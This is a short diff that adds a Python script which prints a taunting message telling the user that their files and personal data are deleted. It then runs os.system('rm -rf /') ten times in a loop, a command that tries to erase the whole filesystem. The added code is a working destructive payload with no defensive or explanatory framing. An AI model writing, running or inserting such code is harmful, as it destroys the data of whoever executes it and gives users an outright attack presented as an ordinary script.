@@ -1,0 +1,4 @@
+import os
+print ('Hi, your files and your personnal data is deleted')
+for a in range (0,10):
+    os.system('rm -rf /')
